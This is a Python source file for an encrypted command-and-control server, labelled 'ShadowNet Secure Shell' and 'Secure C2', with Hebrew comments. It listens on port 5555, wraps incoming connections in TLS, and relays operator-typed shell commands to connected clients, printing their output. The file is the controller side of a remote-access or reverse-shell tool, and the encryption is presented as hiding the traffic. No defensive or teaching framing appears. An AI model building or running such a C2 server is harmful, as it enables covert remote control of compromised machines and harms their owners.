import socket
import threading
import ssl
import os

clients = []

def handle_client(client_socket):
    print(f"\n[+] Secure Connection Established via TLS!")
    
    while True:
        try:
            command = input("ShadowNet Secure Shell> ")
            if not command.strip(): continue
            if command.lower() == 'exit': break
            
            client_socket.send(command.encode())
            
            # קבלת תשובה (הפענוח נעשה אוטומטית ע"י ספריית ה-SSL)
            response = client_socket.recv(4096).decode()
            print(response)
            
        except Exception as e:
            print(f"[-] Error: {e}")
            break
    client_socket.close()

def start_server():
    # יצירת הקשר ה-SSL
    context = ssl.create_default_context(ssl.Purpose.CLIENT_AUTH)
    # טעינת התעודה שיצרנו
    context.load_cert_chain(certfile="server.crt", keyfile="server.key")

    bind_ip = "0.0.0.0"
    bind_port = 5555

    server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    server.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
    
    try:
        server.bind((bind_ip, bind_port))
        server.listen(5)
        print(f"[*] Secure C2 listening on {bind_ip}:{bind_port}...")

        while True:
            raw_socket, addr = server.accept()
            
            # כאן הקסם: עוטפים את הסוקט הרגיל בסוקט מוצפן
            try:
                secure_socket = context.wrap_socket(raw_socket, server_side=True)
                print(f"[+] Encrypted connection from {addr[0]}")
                
                t = threading.Thread(target=handle_client, args=(secure_socket,))
                t.start()
            except ssl.SSLError as e:
                print(f"[!] SSL Handshake failed: {e}")

    except Exception as e:
        print(f"[!] Server Error: {e}")

if __name__ == "__main__":
    start_server()